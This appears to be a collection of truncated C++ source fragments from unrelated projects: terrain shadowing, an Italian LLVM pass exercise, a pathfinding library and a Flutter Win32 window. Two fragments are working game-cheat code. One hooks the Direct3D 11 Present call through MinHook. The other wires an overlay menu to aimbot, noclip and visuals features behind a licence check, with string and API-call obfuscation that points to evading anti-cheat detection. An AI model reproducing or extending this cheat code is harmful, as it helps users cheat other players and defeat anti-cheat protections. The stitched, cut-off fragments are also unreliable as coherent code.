xx <= width; ++xx)\n                {                    \n                    int ccx = xx + xp;\n                    int ccy = yy + yp;\n                    STempPoints *zzp = points + ccx + ccy * (g_MatrixMap->m_Size.x + 1);\n                    invisible[invisibleCount++] = &zzp->invisible;           \n\n                    SMatrixMapPoint *mapPoint = g_MatrixMap->PointGet(xx + xp, yy+yp);\n                    float zz = mapPoint->z;\n                    if (zz < 0) zz = 0;\n                    if (minz > zz) minz = zz;\n                }\n            }\n        }\n\n        sourcePointsCount = 0;\n\n        SMatrixMapPoint *mapPoint;\n        for (int yy = 0; yy <= MAP_GROUP_SIZE; ++yy)\n        {\n            // left\n            sourcePoints[sourcePointsCount].x = xp * GLOBAL_SCALE;\n            sourcePoints[sourcePointsCount].y = (yy+yp) * GLOBAL_SCALE;\n\n            mapPoint = g_MatrixMap->PointGetTest(xp, yy + yp);\n            if (mapPoint)\n            {\n                sourcePoints[sourcePointsCount].z = mapPoint->z >=0 ? mapPoint->z : 0;\n            }\n            else sourcePoints[sourcePointsCount].z = 0; \n            ++sourcePointsCount;\n\n            // right\n            sourcePoints[sourcePointsCount].x = (xp + MAP_GROUP_SIZE) * GLOBAL_SCALE;\n            sourcePoints[sourcePointsCount].y = (yy+yp) * GLOBAL_SCALE;\n\n            mapPoint = g_MatrixMap->PointGetTest((xp + MAP_GROUP_SIZE), yy + yp);\n            if (mapPoint)\n            {\n                sourcePoints[sourcePointsCount].z = mapPoint->z >= 0 ? mapPoint->z : 0;\n            }\n            else sourcePoints[sourcePointsCount].z = 0;\n            ++sourcePointsCount;\n\n        }\n        for (int xx = 1; xx < MAP_GROUP_SIZE; ++xx)\n        {\n            // up\n            sourcePoints[sourcePointsCount].x = (xx+xp) * GLOBAL_SCALE;\n            sourcePoints[sourcePointsCount].y = yp * GLOBAL_SCALE;\n            mapPoint = g_MatrixMap->PointGetTest((xx+xp), yp);\n            if (mapPoint)\n            {\n                sourcePoints[sourcePointsCount].z = mapPoint-> z >= 0 ? mapPoint->z : 0;\n            }\n            else sourcePoints[sourcePointsCount].z = 0;\n            ++sourcePointsCount;\n\n            // down\n            sourcePoints[sourcePointsCount].x = (xx+xp) * GLOBAL_SCALE;\n            sourcePoints[sourcePointsCount].y = (yp+MAP_GROUP_SIZE) * GLOBAL_SCALE;\n            mapPoint = g_MatrixMap->PointGetTest((xx+xp), (yp+MAP_GROUP_SIZE));\n            if (mapPoint)\n            {\n                sourcePoints[sourcePointsCount].z = mapPoint-> z >= 0 ? mapPoint->z : 0;\n            }\n            else sourcePoints[sourcePointsCount].z = 0;\n            ++sourcePointsCount;\n        }\n    }\n\n\n\n    void BuildShadowFor(const D3DXVECTOR3 &pointsFrom, int pointsCount, STempPoints *points, CBuf &pe)\n    {\n\n        for (int i = 0; i < pointsCount; ++i)\n                points[i].invisibleNow = 0;\n\n\n        SPotEdge *edge = pe.Buff<SPotEdge>();\n        SPotEdge *bufferEnd = pe.BuffEnd<SPotEdge>();\n\n        SPlane vPlane;\n\n        for (; edge < bufferEnd; ++edge)\n        {\n            bool os1 = edge->plane1.IsOnSide(pointsFrom);\n            bool os2 = edge->plane2.IsOnSide(pointsFrom);\n            if (!(os1 ^ os2))\n\t\t\t\tcontinue;\n\n    #ifdef _DEBUG\n            CHelper::Create(10000,888)->Cone(edge->p1, edge->p2, 2, 2, 0xFF00FF00, 0xFF00FF00, 3);\n    #endif\n\n            D3DXVECTOR2 p20(edge->p1.x",
    "//===-- LocalOpts.cpp - Example Transformations --------------------------===//\n//\n// Part of the LLVM Project, under the Apache License v2.0 with LLVM Exceptions.\n// See https://llvm.org/LICENSE.txt for license information.\n// SPDX-License-Identifier: Apache-2.0 WITH LLVM-exception\n//\n//===----------------------------------------------------------------------===//\n\n#include \"llvm/Transforms/Utils/LocalOpts.h\"\n#include \"llvm/IR/Instructions.h\"\n#include \"llvm/IR/InstrTypes.h\"\n#include \"llvm/IR/IRBuilder.h\"\n\nusing namespace llvm;\n\nbool runOnBasicBlock(BasicBlock &B) {\n    \n    // Preleviamo le prime due istruzioni del BB\n    Instruction &Inst1st = *B.begin(), &Inst2nd = *(++B.begin());\n\n    // L'indirizzo della prima istruzione deve essere uguale a quello del \n    // primo operando della seconda istruzione (per costruzione dell'esempio)\n    assert(&Inst1st == Inst2nd.getOperand(0));\n\n    // Stampa la prima istruzione\n    outs() << \"PRIMA ISTRUZIONE: \" << Inst1st << \"\\n\";\n    // Stampa la prima istruzione come operando\n    outs() << \"COME OPERANDO: \";\n    Inst1st.printAsOperand(outs(), false);\n    outs() << \"\\n\";\n\n    // User-->Use-->Value\n    outs() << \"I MIEI OPERANDI SONO:\\n\";\n    for (auto *Iter = Inst1st.op_begin(); Iter != Inst1st.op_end(); ++Iter) {\n      Value *Operand = *Iter;\n\n      if (Argument *Arg = dyn_cast<Argument>(Operand)) {\n        outs() << \"\\t\" << *Arg << \": SONO L'ARGOMENTO N. \" << Arg->getArgNo() \n\t       <<\" DELLA FUNZIONE \" << Arg->getParent()->getName()\n               << \"\\n\";\n      }\n      if (ConstantInt *C = dyn_cast<ConstantInt>(Operand)) {\n        outs() << \"\\t\" << *C << \": SONO UNA COSTANTE INTERA DI VALORE \" << C->getValue()\n               << \"\\n\";\n      }\n    }\n\n    outs() << \"LA LISTA DEI MIEI USERS:\\n\";\n    for (auto Iter = Inst1st.user_begin(); Iter != Inst1st.user_end(); ++Iter) {\n      outs() << \"\\t\" << *(dyn_cast<Instruction>(*Iter)) << \"\\n\";\n    }\n\n    outs() << \"E DEI MIEI USI (CHE E' LA STESSA):\\n\";\n    for (auto Iter = Inst1st.use_begin(); Iter != Inst1st.use_end(); ++Iter) {\n      outs() << \"\\t\" << *(dyn_cast<Instruction>(Iter->getUser())) << \"\\n\";\n    }\n\n    // Manipolazione delle istruzioni\n    Instruction *NewInst = BinaryOperator::Create(\n        Instruction::Add, Inst1st.getOperand(0), Inst1st.getOperand(0));\n\n    NewInst->insertAfter(&Inst1st);\n    // Si possono aggiornare le singole references separatamente?\n    // Controlla la documentazione e prova a rispondere.\n    Inst1st.replaceAllUsesWith(NewInst);\n\n    LLVMContext &context = B.getContext();\n \n\t  //Per cancellare le righe di codice che contengono il \"x+0=0+\" || \"x*1=1*x\"\n\t  std::vector<Instruction *> InstToDelete;\n    IRBuilder<> Builder(context);\n\n\t    //Parto prendendo il basic block\n\t    //Ne scorro tutte le istruzioni\n\t        for (Instruction &instIter : B) \n\t        {\n\t          //Ora controllo che la mia sia una operazione\n\t          if (auto *BinOp = dyn_cast<BinaryOperator>(&instIter)) \n\t          {\n              //      LEGENDA \n                  /*      PUNTO [0]   -   ESERCIZIO 2 - un passo piu utile\n                        sostituire tutte le operazioni di moltiplicazione per due con una shift\n                  */\n\n                  /*      PUNTO [1]   -   ALGEBRAIC IDENTITY: \n                        (1)   x+0 = 0+x = x   - [1] PRIMA PARTE\n                        (2)   x*1 = 1*x = x   - [1] SECONDA PARTE\n                  */\n\n                  /*       PUNTO [2]   -   STRENGTH REDUCTION: \n                        (1)   15*x = x*15 -> (x<<4) - x   - [2] PRIMA PARTE\n                        (2)   y = x / 8 -> y = x >>3      - [2] SECONDA PARTE\n                  */\n\n                  /*      PUNTO [3] - MULTI-INSTRUCTION OPTIMIZATION\n                              a = b + 1, c = a - 1 -> a = b + 1, c = b\n                  */\n\n\n                  // [1] PRIMA PARTE\n\t                //controllo che l'operando sia un add\n\t                if (BinOp->getOpcode() == Instruction::Add) \n\t                {\n                    //Prima controllo se \u00e8 nella forma \"0+x\"\n                    if (ConstantInt *CI = dyn_cast<ConstantInt>(BinOp->getOperand(0))) \n                    {\n                        if (CI->isZero()) \n                        {\n                            //Mi salvo il valore della x in una variabile Value\n                            Value *X = BinOp->getOperand(1);\n                            //Rimpiazzo tutte le occorrenze con la x stessa\n                            BinOp->replaceAllUsesWith(X);\n                            //Aggiungo l'istruzione a quelle da cancellare\n                            InstToDelete.push_back(&instIter);\n                        }\t        \n                    } \n                    //Ora controllo se \u00e8 nella forma \"x+0\"\n                    else if (ConstantInt *CI = dyn_cast<ConstantInt>(BinOp->getOperand(1))) \n                    {\n                        if (CI->isZero()) \n                        {\n                            Value *X = BinOp->getOperand(0);\n    ",
    "/*\n    This Source Code Form is subject to the terms of the Mozilla Public\n    License, v. 2.0. If a copy of the MPL was not distributed with this\n    file, You can obtain one at https://mozilla.org/MPL/2.0/.\n*/\n\n#include <proxima/proxima.hpp>\n\n#include <cmath>\n#include <list>\n\nusing namespace proxima;\n\nvoid MovementDirection::fromVector(float x, float y)\n{\n    dir = 0;\n    if (std::abs(x) > 0.0f)\n    {\n        dir |= (uint8_t)Direction::X;\n        if (x < 0.0f)\n            dir |= (uint8_t)Direction::InvertX;\n    }\n    if (std::abs(y) > 0.0f)\n    {\n        dir |= (uint8_t)Direction::Y;\n        if (y < 0.0f)\n            dir |= (uint8_t)Direction::InvertY;\n    }\n}\n\nfloat MovementDirection::getAngle() const\n{\n    float x = dir & (uint8_t)Direction::X ? 1.0f : 0.0f;\n    if (dir & (uint8_t)Direction::InvertX) x = -x;\n    float y = dir & (uint8_t)Direction::Y ? 1.0f : 0.0f;\n    if (dir & (uint8_t)Direction::InvertY) y = -y;\n\n    return std::atan2(y, x);\n}\n\nbool MovementDirection::hasMagnitude() const\n{\n    return (dir & (uint8_t)Direction::X) || (dir & (uint8_t)Direction::Y);\n}\n\nstd::tuple<bool, uint16_t> getDirectPathLow(const Grid<uint8_t> *costField, int x0, int y0, int x1, int y1)\n{\n    uint16_t totalCost = 0;\n\n    int dx = x1 - x0;\n    int dy = y1 - y0;\n\n    int yi = 1;\n    if (dy < 0)\n    {\n        yi = -1;\n        dy = -dy;\n    }\n    int D = (2 * dy) - dx;\n    int y = y0;\n\n    for (int x = x0; x <= x1; x++)\n    {\n        uint8_t cost = (*costField)(x, y);\n        if (cost == 255) return { false, totalCost };\n        totalCost += cost;\n        if (D > 0)\n        {\n            y += yi;\n            D += (2 * (dy - dx));\n        }\n        else\n        {\n            D += 2*dy;\n        }\n    }\n\n    return { true, totalCost };\n}\n\nstd::tuple<bool, uint16_t> getDirectPathHigh(const Grid<uint8_t> *costField, int x0, int y0, int x1, int y1)\n{\n    uint16_t totalCost = 0;\n\n    int dx = x1 - x0;\n    int dy = y1 - y0;\n\n    int xi = 1;\n    if (dx < 0)\n    {\n        xi = -1;\n        dx = -dx;\n    }\n    int D = (2 * dx) - dy;\n    int x = x0;\n\n    for (int y = y0; y <= y1; y++)\n    {\n        uint8_t cost = (*costField)(x, y);\n        if (cost == 255) return { false, totalCost };\n        totalCost += cost;\n        if (D > 0)\n        {\n            x += xi;\n            D += (2 * (dx - dy));\n        }\n        else\n        {\n            D += 2*dx;\n        }\n    }\n\n    return { true, totalCost };\n}\n\n// Based on Bresenham's line alogorithm\nstd::tuple<bool, uint16_t> proxima::GetDirectPath(const Grid<uint8_t> *costField, const uint32_t a, const uint32_t b)\n{\n    auto [x0, y0] = costField->getCoordinate(a);\n    auto [x1, y1] = costField->getCoordinate(b);\n\n    if (std::abs(int(y1) - int(y0)) < std::abs(int(x1) - int(x0)))\n    {\n        if (x0 > x1)\n            return getDirectPathLow(costField, x1, y1, x0, y0);\n        else\n            return getDirectPathLow(costField, x0, y0, x1, y1);\n    }\n    else\n    {\n        if (y0 > y1)\n            return getDirectPathHigh(costField, x1, y1, x0, y0);\n        else\n            return getDirectPathHigh(costField, x0, y0, x1, y1);\n    }\n}\n\n// Based on algorithm described by https://web.archive.org/web/20190725152730/http://aigamedev.com/open/tutorial/clearance-based-pathfinding/\nuint32_t proxima::GetCellClearance(const Grid<uint8_t> *costField, const uint32_t x, const uint32_t y, const uint32_t maxClearance)\n{\n    for (uint32_t i = 0; ; i++)\n    {\n        uint32_t diagx = x + i;\n        uint32_t diagy = y + i;\n\n        if (diagx >= costField->width() || diagy >= costField->height()) return i - 1;\n\n        if ((*costField)(diagx, diagy) == 255) return i;\n        for (uint32_t j = 1; j < i; j++)\n        {\n            // Check vertically\n            if ((*costField)(diagx, diagy - j) == 255) return i;\n            // Check horizontally\n            if ((*costField)(diagx - j, diagy) == 255) return i;\n        }\n\n        if (maxClearance != 0 && i == maxClearance) return i;\n    }\n}\n\nvoid proxima::GenerateIntegrationField(const Grid<uint8_t> *cost, const uint32_t target, Grid<uint16_t> *result)\n{\n    result->fill(65535);\n\n    std::list<uint32_t> openList;\n    (*result)[target] = 0;\n    openList.push_back(target);\n\n    while (!openList.empty())\n    {\n        // Get next node in open list\n        uint32_t id = openList.front();\n        openList.pop_front();\n\n        auto [x, y] = cost->getCoordinate(id);\n\n        // Get neighbours\n        std::vector<uint32_t> neighbours = cost->getDirectNeighbours(x, y);\n\n        for (uint32_t i = 0; i < neighbours.size(); i++)\n        {\n            if ((*cost)[neighbours[i]] == 255)\n                continue;\n\n            uint32_t endCost = (*result)[id] + (*cost)[neighbours[i]];\n            if (endCost < (*result)[neighbours[i]])\n            {\n                openList.push_back(neighbours[i]);\n                (*result)[neighbours[i]] = (uint16_t)endCost;\n            }\n        }\n    }\n}\n\nvoid proxima::CombineIntegrationFields(const Grid<uint16_t> *a, const Grid<uint16_t> ",
    "#include \"d3d_Hook.hpp\"\r\n\r\n#include <MinHook.h>\r\n\r\nbool Hook::Init()\r\n{\r\n\tconst std::string Title = E(\"SKYPE TERMINAL CALLING\");\r\n\r\n\tWNDCLASSEX Window;\r\n\r\n\tWindow.cbSize = sizeof(WNDCLASSEX);\r\n\tWindow.style = CS_HREDRAW | CS_VREDRAW;\r\n\r\n\tWindow.lpfnWndProc = DefWindowProcA;\r\n\tWindow.cbClsExtra = NULL;\r\n\tWindow.cbWndExtra = NULL;\r\n\tWindow.hInstance = SAFE_CALL(GetModuleHandleA)(nullptr);\r\n\tWindow.hIcon = NULL;\r\n\tWindow.hCursor = NULL;\r\n\tWindow.hbrBackground = NULL;\r\n\tWindow.lpszMenuName = NULL;\r\n\tWindow.lpszClassName = Title.c_str();\r\n\tWindow.hIconSm = NULL;\r\n\r\n\tSAFE_CALL(RegisterClassExA)(&Window);\r\n\r\n\tHWND WindowA = CreateWindowA(Window.lpszClassName, Title.c_str(), WS_OVERLAPPEDWINDOW, 0, 0, 100, 100, 0, 0, Window.hInstance, 0);\r\n\r\n\tHMODULE D3D11_DLL;\r\n\tif ((D3D11_DLL = SAFE_CALL(GetModuleHandleA)(E(\"d3d11.dll\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tvoid* D3D11CreateDeviceAndSwapChain;\r\n\r\n\tif ((D3D11CreateDeviceAndSwapChain = SAFE_CALL(GetProcAddress)(D3D11_DLL, E(\"D3D11CreateDeviceAndSwapChain\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tD3D_FEATURE_LEVEL featureLevel;\r\n\tconst D3D_FEATURE_LEVEL featureLevels[] = { D3D_FEATURE_LEVEL_10_1, D3D_FEATURE_LEVEL_11_0 };\r\n\tDXGI_RATIONAL refreshRate;\r\n\trefreshRate.Numerator = 60;\r\n\trefreshRate.Denominator = 1;\r\n\r\n\tDXGI_MODE_DESC bufferDesc;\r\n\tbufferDesc.Width = 100;\r\n\tbufferDesc.Height = 100;\r\n\tbufferDesc.RefreshRate = refreshRate;\r\n\tbufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;\r\n\tbufferDesc.ScanlineOrdering = DXGI_MODE_SCANLINE_ORDER_UNSPECIFIED;\r\n\tbufferDesc.Scaling = DXGI_MODE_SCALING_UNSPECIFIED;\r\n\r\n\tDXGI_SAMPLE_DESC sampleDesc;\r\n\tsampleDesc.Count = 1;\r\n\tsampleDesc.Quality = 0;\r\n\r\n\tDXGI_SWAP_CHAIN_DESC swapChainDesc;\r\n\tswapChainDesc.BufferDesc = bufferDesc;\r\n\tswapChainDesc.SampleDesc = sampleDesc;\r\n\tswapChainDesc.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;\r\n\tswapChainDesc.BufferCount = 1;\r\n\tswapChainDesc.OutputWindow = WindowA;\r\n\tswapChainDesc.Windowed = 1;\r\n\tswapChainDesc.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;\r\n\tswapChainDesc.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH;\r\n\r\n\tIDXGISwapChain* swapChain;\r\n\tID3D11Device* device;\r\n\tID3D11DeviceContext* context;\r\n\r\n\tif (((long(__stdcall*)(\r\n\t\tIDXGIAdapter*,\r\n\t\tD3D_DRIVER_TYPE,\r\n\t\tHMODULE,\r\n\t\tUINT,\r\n\t\tconst D3D_FEATURE_LEVEL*,\r\n\t\tUINT,\r\n\t\tUINT,\r\n\t\tconst DXGI_SWAP_CHAIN_DESC*,\r\n\t\tIDXGISwapChain**,\r\n\t\tID3D11Device**,\r\n\t\tD3D_FEATURE_LEVEL*,\r\n\t\tID3D11DeviceContext**))(D3D11CreateDeviceAndSwapChain))(0, D3D_DRIVER_TYPE_HARDWARE, 0, 0, featureLevels, 2, D3D11_SDK_VERSION, &swapChainDesc, &swapChain, &device, &featureLevel, &context) < 0)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tg_methodsTable = (uint64_t*)calloc(205, sizeof(uint64_t));\r\n\r\n\tmemcpy(g_methodsTable, *(uint64_t**)swapChain, 18 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18, *(uint64_t**)device, 43 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18 + 43, *(uint64_t**)context, 144 * sizeof(uint64_t));\r\n\r\n\tMH_Initialize();\r\n\r\n\tswapChain->Release();\r\n\tswapChain = 0;\r\n\r\n\tdevice->Release();\r\n\tdevice = 0;\r\n\r\n\tcontext->Release();\r\n\tcontext = 0;\r\n\r\n\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\treturn true;\r\n}\r\n\r\nbool Hook::Present(void** hk_originalFunction, void* hk_hookedPresent)\r\n{\r\n\tif (!hk_originalFunction || !hk_hookedPresent)\r\n\t\treturn false;\r\n\r\n\tvoid* target = (void*)g_methodsTable[8];\r\n\r\n\tif (!target)\r\n\t\treturn false;\r\n\r\n\tif (MH_CreateHook(target, hk_hookedPresent, hk_originalFunction) != MH_OK || MH_EnableHook(target) != MH_OK)\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\r\n\treturn true;\r\n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"Core.hpp\"\r\n\r\n#include \"d3d_Hook.hpp\"\r\n#include \"Menu.hpp\"\r\n#include \"Classes.hpp\"\r\n#include \"Settings.hpp\"\r\n#include \"Visuals.hpp\"\r\n#include \"Player.hpp\"\r\n#include \"Aimbot.hpp\"\r\n#include \"Weapon.hpp\"\r\n#include \"NoClip.hpp\"\r\n#include \"vehicule.hpp\"\r\n#include \"auth.hpp\"\r\n#include \"Fonts.hpp\"\r\n#include <imguinotify.hpp>\r\n#include <program.hpp>\r\n\r\n#pragma comment(lib, \"proxine.lib\")\r\n\r\n//#include \"Snow.hpp\"\r\nextern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);\r\n// you need those for snowflake\r\n#define WINDOW_WIDTH  1920\r\n#define WINDOW_HEIGHT 1080\r\nbool IsValid = false;\r\n\r\nvoid Kouloumbou()\r\n{\r\n\tstd::exit(-1);\r\n}\r\nvoid InitImGui()\r\n{\r\n\tusing namespace DirectX;\r\n\r\n\tImGui::CreateContext();\r\n\r\n\tImGuiIO* io = &ImGui::GetIO();\r\n\tio->ConfigFlags = ImGuiConfigFlags_NoMouseCursorChange;\r\n\tio->IniFilename = nullptr;\r\n\tio->LogFilename = nullptr;\r\n\r\n\tstatic const ImWchar icons_ranges[] = { ICON_MIN_FA, ICON_MAX_FA, 0 };\r\n\tImFontConfig icons_config;\r\n\r\n\ticons_config.MergeMode = true;\r\n\ticons_config.PixelSnapH = true;\r\n\t\r\n\tImFontConfig rubik;\r\n\trubik.FontDataOwnedByAtlas = false;\r\n\t\r\n\r\n\tio->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 15.5f, &rubik);\r\n\tio->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 25.f, &icons_config, icons_ranges);\r\n\tio->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 25.f, &icons_config, icons_ranges);\r\n\tMenu::BiggestIcon = io->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 40.f, NULL, icons_ranges);\r\n\tMenu::BiggestFont = io->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 21.f, &rubik);\r\n\tMenu::littleFont = io->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 17.5f, &rubik);\r\n\r\n\tImGui_ImplWin32_Init(Window);\r\n\tImGui_ImplDX11_Init(pDevice, pContext);\r\n\t\r\n\t//Snowflake::CreateSnowFlakes(snow, SNOW_LIMIT, 5.f/*minimum size*/, 25.f/*maximum size*/, 0/*imgui window x position*/, 0/*imgui window y position*/, WINDOW_WIDTH, WINDOW_HEIGHT, Snowflake::vec3(0.f, 0.005f)/*gravity*/, IM_COL32(255,255, 255, 100)/*color*/);\r\n\r\n}\r\n\r\n\r\nLRESULT __stdcall WindowHandler(const HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)\r\n{\r\n\tif (Menu::Open)\r\n\t{\r\n\t\tImGui_ImplWin32_WndProcHandler(hWnd, uMsg, wParam, lParam);\r\n\t\treturn true;\r\n\t}\r\n\r\n\treturn SAFE_CALL(CallWindowProcA)(DirectX::WindowEx, hWnd, uMsg, wParam, lParam);\r\n}\r\n\r\n\r\nbool BindD3DInfo(IDXGISwapChain* pSwapChain)\r\n{\r\n\tif (SUCCEEDED(pSwapChain->GetDevice(__uuidof(ID3D11Device), (void**)&DirectX::pDevice)))\r\n\t{\r\n\t\tDirectX::pDevice->GetImmediateContext(&DirectX::pContext);\r\n\t\tDXGI_SWAP_CHAIN_DESC sd;\r\n\r\n\t\tpSwapChain->GetDesc(&sd);\r\n\t\tDirectX::Window = sd.OutputWindow;\r\n\t\t\r\n\t\r\n\t\tID3D11Texture2D* pBackBuffer;\r\n\r\n\t\tpSwapChain->GetBuffer(0, __uuidof(ID3D11Texture2D), (LPVOID*)&pBackBuffer);\r\n\t\tDirectX::pDevice->CreateRenderTargetView(pBackBuffer, 0, &DirectX::renderTargetView);\r\n\t\tpBackBuffer->Release();\r\n\r\n\t\tDirectX::WindowEx = (WNDPROC)LI_FN(SetWindowLongPtrA).safe_cached()(DirectX::Window, GWLP_WNDPROC, (LONG_PTR)WindowHandler);\r\n\r\n\t\tInitImGui();\r\n\r\n\t\tMenu::FirstTime = false;\r\n\r\n\t\tMenu::Style();\r\n\r\n\t\treturn true;\r\n\t}\r\n\r\n\treturn false;\r\n}\r\nbool AuthConnected = false;\r\n\r\nchar Licence[50] = \"\";\r\nchar UserName[20] = \"\";\r\nchar RgPassWord[20] = \"\";\r\nchar RgUserName[20] = \"\";\r\nstatic int Tabs = 2;\r\nstatic int Checks = 0;\r\nHRESULT __stdcall PresentHook(IDXGISwapChain* pSwapChain, UINT SyncInterval, UINT Flags)\r\n{\r\n\tif (Menu::FirstTime)\r\n\t{\r\n\r\n\t\tif (!BindD3DInfo(pSwapChain))\r\n\t\t\treturn DirectX::OriginalPresent(pSwapChain, SyncInterval, Flags);\r\n\t}\r\n\r\n\tImGui_ImplDX11_NewFrame();\r\n\tImGui_ImplWin32_NewFrame();\r\n\tImGui::NewFrame();\r\n\r\n\tif (SAFE_CALL(GetAsyncKeyState)(VK_INSERT) & 1)\r\n\t{\r\n\r\n\t\tMenu::Open = !Menu::Open;\r\n\t}\r\n\tif (SAFE_CALL(GetAsyncKeyState)(0x58) & 1)\r\n\t{\r\n\t\tSettings::Player::NoClip = !Settings::Player::NoClip;\r\n\t}\r\n\tImGui::GetIO().MouseDrawCursor = Menu::Open;\r\n\tImGui::GetIO().WantCaptureKeyboard = Menu::Open;\r\n\tif (AuthConnected)\r\n\t{\r\n\t\t\r\n\r\n\t\tVisuals::Hook();\r\n\t\tPlayers::Hook();\r\n\t\tif 